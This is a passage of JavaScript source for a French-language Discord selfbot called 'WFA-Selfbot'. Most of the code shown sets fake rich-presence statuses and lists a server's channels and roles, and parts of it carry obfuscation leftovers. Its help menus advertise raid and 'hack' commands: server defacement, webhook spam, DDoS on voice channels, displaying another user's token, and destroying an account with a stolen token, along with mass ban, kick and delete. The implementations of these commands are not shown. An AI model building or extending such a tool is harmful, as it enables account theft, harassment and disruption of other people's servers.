                .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                .setType('WATCHING')
                .setApplicationId("603405368940429315")
                .setDetails("Instagram")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE INFLUENCER WITH WFA")
                .setState(State)
                .setStartTimestamp(Date['now']())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error)
            console.log("Commande Instagram executé".yellow)
            message.edit(":white_check_mark: **Tu regardes " + State + ' sur Instagram**');
        });
    }
    if (message.content.startsWith(prefix + 'youtube')) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot"
        rpcGenerator.getRpcImage("603405368940429315", "youtube").then(img => {
            let Presence = new rpcGenerator.Rpc()
                .setName("Youtube")
                .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                .setType("WATCHING")
                .setApplicationId("603405368940429315")
                .setDetails("Youtube")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE YOUTUBER WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(Presence.toDiscord()).catch(console.error)
            console.log("Commande Youtube executé".yellow);
            message.edit(":white_check_mark: **Tu regardes " + State + " sur Youtube**");
        });
    }

    if (message.content.startsWith(prefix + "tokyo ghoul")) {
        let argument = args.splice(2).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "tokyo")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Tokyo Ghoul")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("WATCHING")
                    .setApplicationId("603405368940429315")
                    .setDetails('Tokyo Ghoul')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Tokyo Ghoul executé'.yellow);
                message.edit(`:white_check_mark: **Tu regardes ${argument} sur Tokyo Ghoul**`);
            })
    }
    if (message.content.startsWith(prefix + "hunter x hunter")) {
        let argument = args.splice(3).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "hxh")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Hunter X Hunter")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("WATCHING")
                    .setApplicationId("603405368940429315")
                    .setDetails('Hunter X Hunter')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Hunter X Hunter executé'.yellow);
                message.edit(`:white_check_mark: **Tu regardes ${argument} sur Hunter X Hunter**`);
            })
    }
    if (message.content.startsWith(prefix + "naruto")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("721465320740487179", "naruto")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Naruto")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("WATCHING")
                    .setApplicationId("721465320740487179")
                    .setDetails('Naruto')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("Delta-Selfbot R")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Naruto executé'.yellow);
                message.edit(`:white_check_mark: **Tu regardes ${argument} sur Naruto**`);
            })
    }
    if (message.content.startsWith(prefix + "pornhub")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "pornhub")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Pornhub")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("WATCHING")
                    .setApplicationId("603405368940429315")
                    .setDetails('Pornhub')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Pornhub executé'.yellow);
                message.edit(`:white_check_mark: **Tu regardes ${argument} sur Pornhub**`);
            })
    }
    if (message.content.startsWith(prefix + "clash of clan")) {
        let argument = args.splice(3).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("721465320740487179", "clash-of-clans-app-icon")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Clash Of Clan")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("721465320740487179")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Clash Of Clan executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Clash Of Clan**`);
            })
    }
    if (message.content.startsWith(prefix + "minecraft")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "minecraft")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Minecraft")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Minecraft executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Minecraft**`);
            })
    }
    if (message.content.startsWith(prefix + "clash royal")) {
        let argument = args.splice(2).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "clashroyal")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Clash Royal")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Clash Royal executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Clash Royal**`);
            })
    }
    if (message.content.startsWith(prefix + "tinder")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "tinder")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Tinder")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Tinder executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Tinder**`);
            })
    }
    if (message.content.startsWith(prefix + "roblox")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "roblox")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Roblox")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Roblox executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Roblox**`);
            })
    }
    if (message.content.startsWith(prefix + "badlion")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "badlion")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Badlion")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Badlion executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Badlion**`);
            })
    }
    if (message.content.startsWith(prefix + "apex")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "apex")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Apex Legends")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())

                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Apex Legends executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur Apex Legends**`);
            })
    }
    if (message.content.startsWith(prefix + "csgo")) {
        let argument = args.splice(1).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "csgo")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Counter Strike")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())
                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande csgo executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur csgo**`);
            })
    }
    if (message.content.startsWith(prefix + "among us")) {
        let argument = args.splice(2).join(" ") || "Delta-Selfbot";
        rpcGenerator.getRpcImage("603405368940429315", "amongus")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Among us")
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType("PLAYING")
                    .setApplicationId("603405368940429315")
                    .setDetails('WFA-Selfbot')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("WFA-Selfbot")
                    .setState(argument)
                    .setStartTimestamp(Date.now())
                    .setParty({
                        id: uuid()
                    })
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande among us executé'.yellow);
                message.edit(`:white_check_mark: **Tu joues à ${argument} sur among us**`);
            })
    }
    if (message.content.startsWith(prefix + "fortnite")) {
        let State = args.splice(-0xb81 * -0x3 + -0x2116 + 0xd * -0x1c).join(' ') || "WFA-Selfbot";
        rpcGenerator.getRpcImages("603405368940429315", "fortnite").then(img => {
            let Presence = new rpcGenerator[("Rpc")]()
                .setName("Fortnite")
                .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                .setType("PLAYING")
                .setApplicationId("603405368940429315")
                .setDetails("WFA Selfbot")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("WFA-Selfbot E")
                .setState(State)
                .setStartTimestamp(Date['now']())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(Presence.toDiscord()).catch(console.error)
            console.log("Commande f" + "ortnite executé".yellow);

            message.edit(':white_check_mark: **Tu joues à ' + State + ' sur fortnite**');
        });
    }
    if (message.content.startsWith(prefix + "rocket league")) {
        let State = args.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages("603405368940429315", "rocket_league").then(img => {
            let Presence = new rpcGenerator.Rpc()
                .setName("Rocket League")
                .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                .setType('PLAYING')
                .setJoinSecret("MTI4NzM0OjFpMmhuZToxMjMxMjM")
                .setPartyId("ae488379-351d-4a4f-ad32-2b9b01c91657")
                .setApplicationId("603405368940429315")
                .setDetails("WFA Selfbot")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("WFA-Selfbot")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(Presence.toDiscord()).catch(console.error);
            console.log('Commande rocket league executé'.yellow);
            message.edit(':white_check_mark: **Tu joues à ' + State + ' sur rocket league**');

        });
    }
    if (msg.content === prefix + "channels list") {
        if (!msg.guild) {
            return message.edit(":x: **Commande uniquement utilisable sur un serveur**");
        }
        const guildChannels = message.guild.channels;
        for (pas = 0; pas < 10; pas++) {
            message.edit('>>> **Commandes Channels - List | WFA - Selfbot**\n\n\nliste des salons:\n```\n' + guildChannels.map(a => a.name) + '\n```\n        ').catch(e => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        }
        console.log("Commande channels list executé".yellow);
    }
    if (msg.content === prefix + "roles list") {
        if (!msg.guild) return message.edit(":x: **Commande uniquement utilisable sur" + ' un serveu' + "r**");
        const guildRoles = message.guild.roles;
        message.edit('>>> Commandes Roles - List | WFA - Selfbot\nliste des roles:",\n```\n' + guildRoles.map(a => a.name) + '\n```\n').catch(e => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log("Commande roles list executé".yellow);
    }
    if (message.content === prefix + 'cmd')
        message.channel.send('>>> 🌀 **__Liste des commandes:__** 2/2\n```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝙖𝙞𝙙** :no_entry_sign: :\n    `deface`, `spam`, `webhook spam`, `create channel`, `stop spam`\n    \n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙃𝙖𝙘𝙠** :skull_and_crossbones: :\n    `check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`\n    \n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙐𝙩𝙞𝙡𝙚** :globe_with_meridians: :\n    `nuke dm`, `mp all`, `stop mp all`, `grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote`, `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`\n    \n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙩𝙖𝙩𝙪𝙩** :performing_arts: :\n    `rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`\n    \n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ');
    message.edit('>>> 🌀 **__Liste des commandes:__** 1/2\n    ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n    **  𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙃𝙚𝙡𝙥** :gear: :\n    `help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`, `help raid`\n    \n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝘽𝙖𝙘𝙠𝙪𝙥 ** :dvd: :\n    `backup friend`, `backup create`,`backup info`, `backup load`, `backup delete`, `backup purge`, `backup info`\n    \n    \n    ** 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙪𝙣** :joy:: \n    `auto voice kick`, `stop auto voice kick`, `start typing`, `branlette`, `lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`\n    \n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣** :tools: :\n    `voice kick`, `set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`\n    \n    \n    **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙉𝙨𝙛𝙬 ** :underage: :\n    `ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`\n    \n    \n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ').catch(e => console.log('[', "ERROR".red, e, ']', "une erreur est survenue que je ne peux régler".green))
    console.log("Commande cmd executé".yellow);
    if (message.content === prefix + 'help') {
        message.edit('>>> 🌙**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥**🌙\n    ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n    \n    **' + prefix + 'cmd**\n    `Liste des commandes`\n    \n    \n    **' + prefix + 'help fun**\n    `Affiche les commandes fun` :joy:\n    \n    \n    **' + prefix + 'help backup**\n    `Affiche les commandes backups` :gear:\n    \n    \n    **' + prefix + 'help moderation**\n    `Affiche les commandes moderation` :tools:\n    \n    \n    **' + prefix + 'help utile**\n    `Affiche les commandes info` :globe_with_meridians:\n      \n    \n    **' + prefix + 'help nsfw**\n    `Affiche les commandes nsfw` :underage:\n    \n    \n    **' + prefix + 'help raid**\n    `Affiche les commandes raid` :no_entry_sign:\n    \n    \n    **' + prefix + 'help hack**\n    `Affiche les commandes hack` :skull_and_crossbones:\n    \n    \n    **' + prefix + 'help statut**\n    `Affiche les commandes statut` :performing_arts:\n    \n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ').catch(_0xab8ed =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande help executé'.yellow);
    }
    message.content == prefix + 'help backup' && (message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝘽𝙖𝙘𝙠𝙪𝙥** :gear:\n      ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n      \n      **' + prefix + 'backup create**\n      `Créé une backup d\'un serveur`\n      \n      \n      **' + prefix + 'backup friend** \n      `Créé une backup de tous tes amis`\n\n\n      **' + prefix + 'backup load (id)**\n      `Charge une backup`\n\n\n      **' + prefix + 'backup liste**\n      `Voir toutes ses backups`\n\n\n      **' + prefix + 'backup delete (id)**\n      `Surppime une backup`\n\n      **' + prefix + 'backup purge**\n      `Supprime toutes tes backups`\n\n\n      **' + prefix + 'backup info (id)**\n      `Envoie les informations d\'une backup`\n      \n      `le prefix est:  ' + prefix + '`\n      \n      We - Fuck - All\n      \n      \n      \n      ' + yourgif + '\n      ').catch(_0x20ad18 =>
        console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log('Commande help backup executé'.yellow));
    message.content === prefix + 'help raid' && (message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙍𝙖𝙞𝙙**\n  ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n\n  **' + prefix + 'create channel** \n  `Creer 10 channels textuel`\n\n\n  **' + prefix + 'stop spam**\n  `Arrete le spam`\n\n\n  **' + prefix + 'spam (text)** \n  `Spam un text`\n\n\n  **' + prefix + 'webhook spam**\n  `Créer 3 webhooks par salon et spam avec (ultra rapide)`\n\n\n  **' + prefix + 'deface**\n  `Déface entierement un serveur (nom/icon/channels)`\n\n  \n  `le prefix est:  ' + prefix + '`\n  \n  We - Fuck - All\n  \n  \n  \n  ' + yourgif + '\n  ').catch(_0x584a31 =>
        console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log("Commande help hack executé".yellow));
    if (message.content === prefix + 'help hack') {
        message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙃𝙖𝙘𝙠𝙞𝙣𝙜**\n    ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n\n    **' + prefix + 'ddos voc**\n    `Lance une attaque ddos sur les channels vocal`\n\n\n    **' + prefix + 'ddos-stop**\n    `Stop une attaque ddos sur les channels vocal`\n\n\n    **' + prefix + 'token (@user)**\n    `Affiche le token d\'un utilisateur`\n\n\n    **' + prefix + 'check token (token)**\n    `Check si un token est valide`\n\n\n    **' + prefix + 'info token (token)**\n    `Affiche les informations d\'un utilisateur grace a un token`\n\n\n    **' + prefix + 'fuck token (token)**\n    `Detruit le compte d\'un utilisateur grace a un token`\n\n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ').catch(_0x3aac95 =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande help raid executé'.yellow);
    }
    if (message.content == prefix + 'help statut') {
        message.channel.send('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙎𝙩𝙖𝙩𝙪𝙩** 2/2 :performing_arts:\n    ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n    **' + prefix + 'youtube (text)**\n    `Met un statut Youtube`\n\n    **' + prefix + 'tokyo ghoul (text)**\n    `Met un statut Tokyo Ghoul`\n    \n    **' + prefix + 'hunter x hunter (text)**\n    `Met un statut Hunter x Hunter`\n\n    **' + prefix + 'naruto (text)**\n    `Met un statut Naruto`\n\n    **' + prefix + 'clash of clan (text)**\n    `Met un statut Clash of Clan`\n    \n    **' + prefix + 'clash royal (text)**\n    `Met un statut Clash Royal`\n    \n    **' + prefix + 'tinder (text)**\n    `Met un statut Tinder`\n    \n    **' + prefix + 'pornhub (text)**\n    `Met un statut Pornhub`\n    \n    **' + prefix + 'roblox (text)**\n    `Met un statut Roblox`\n    \n    **' + prefix + 'csgo (text)**\n    `Met un statut Csgo`\n    \n    **' + prefix + 'apex (text)**\n    `Met un statut Apex`\n    \n    **' + prefix + 'badlion (text)**\n    `Met un statut Badlion`\n\n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ');
        message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙎𝙩𝙖𝙩𝙪𝙩** 1/2 :performing_arts: \n    ```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n\n    **' + prefix + 'rocket league (text)**\n    `Met un statut Rocket League`\n    \n    **' + prefix + 'spotify (text)**\n    `Met un statut Spofity`\n\n    **' + prefix + 'fortnite (text)**\n    `Met un statut Fortnite`\n    \n    **' + prefix + 'among us (text)**\n    `Met un statut Among us`\n    \n    **' + prefix + 'gucci (text)**\n    `Met un statut Gucci`\n    \n    **' + prefix + 'lacoste (text)**\n    `Met un statut Lacoste`\n\n    **' + prefix + 'nike (text)**\n    `Met un statut Nike`\n    \n    **' + prefix + 'google (text)**\n    `Met un statut Google`\n    \n    **' + prefix + 'skype (text)**\n    `Met un statut Skype`\n    \n    **' + prefix + 'snapchat (text)**\n    `Met un statut Snapchat`\n    \n    **' + prefix + 'facebook (text)**\n    `Met un statut Facebook`\n    \n    **' + prefix + 'tiktok (text)**\n    `Met un statut Tiktok`\n    \n    **' + prefix + 'twitter (text)**\n    `Met un statut Twitter`\n    \n    **' + prefix + 'minecraft (text)**\n    `Met un statut Minecraft`\n    \n    **' + prefix + 'instagram (text)**\n    `Met un statut Instagram`\n\n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ').catch(e =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande help statut executé'.yellow);
    }
    message.content === prefix + 'help fun' && (message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙁𝙪𝙣** :joy:\n```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n  \n  \n      **' + prefix + 'start typing**\n    `Vous affiche entrain d\'ecrire indefiniment`\n    \n    **' + prefix + 'avatar (@user)**\n    `Affiche l\'avatar d\'un membre`\n    \n    **' + prefix + 'lovecalc (@user)**\n    `Test d\'amour`\n    \n    **' + prefix + 'nitro**\n    `Genere un nitro random`\n    \n    **' + prefix + '8ball (text)**\n    `Pose une question`\n    \n    **' + prefix + 'say (text)**\n    `Affiche un text en embed`\n    \n    **' + prefix + 'fight (@user)**\n    `Bat toi avec un utilisateur`\n    \n    **' + prefix + 'boom (@user)**\n    `Fait exploser un utilisateur`\n    \n    **' + prefix + 'rire**\n    `Envoie un gif rire`\n    \n    **' + prefix + 'kiss (@user)**\n    `Embrasse un membre`\n    \n    **' + prefix + 'veski (@user)**\n    `Envoie un gif veski`\n    \n    **' + prefix + 'load**\n    `Envoie un chargement`\n    \n    **' + prefix + 'branlette**\n    `Simule une grosse branlette + éjaculation`\n    \n    **' + prefix + 'punch (@user)**\n    `Frappe un membre`\n    \n    **' + prefix + 'calin (@user)**\n    `Fait un calin a un membre`\n    \n    **' + prefix + 'reverse (text)**\n    `Met ton text a l\'envers`\n  \n      `le prefix est:  ' + prefix + '`\n      \n      We - Fuck - All\n      \n      \n      \n      ' + yourgif + '\n      ').catch(e =>
        console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log("Commande help fun executé".yellow));
    message.content === prefix + 'help moderation' && (message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣** :tools:\n```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n    **' + prefix + 'voice kick (@user)**\n    `Kick un utilisateur du salon vocal`\n    \n    **' + prefix + 'set serveur name (text)**\n    `Change le nom du serveur`\n    \n    **' + prefix + 'shutdown**\n    `Eteint le selfbot`\n    \n    **' + prefix + 'name all**\n    `Rename tout les membres d\'un serveur`\n    \n    **' + prefix + 'ban-all**\n    `Ban tout les membres d\'un serveur`\n\n    **' + prefix + 'kick-all**\n    `Kick tout les membres d\'un serveur`\n    \n    **' + prefix + 'kick (@user)**\n    `kick un membre du serveur`\n    \n    **' + prefix + 'ban (@user)**\n    `Ban un membre du serveur`\n    \n    **' + prefix + 'roles list**\n    `Envoie la liste de tout les roles d\'un serveur`\n    \n    **' + prefix + 'channels list**\n    `Envoie la liste de tout les channels d\'un serveur`\n    \n    **' + prefix + 'purge**\n    `Supprime tout les messages`\n    \n    **' + prefix + 'delete all channel**\n    `Supprime tout les salons d\'un serveur`\n    \n    **' + prefix + 'delete all role**\n    `Supprime tout les roles d\'un serveur`\n\n  \n      `le prefix est:  ' + prefix + '`\n      \n      We - Fuck - All\n      \n      \n      \n      ' + yourgif + '\n      ').catch(e =>
        console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log('Commande help moderation executé'.yellow));
    if (message.content === prefix + 'help nsfw') {
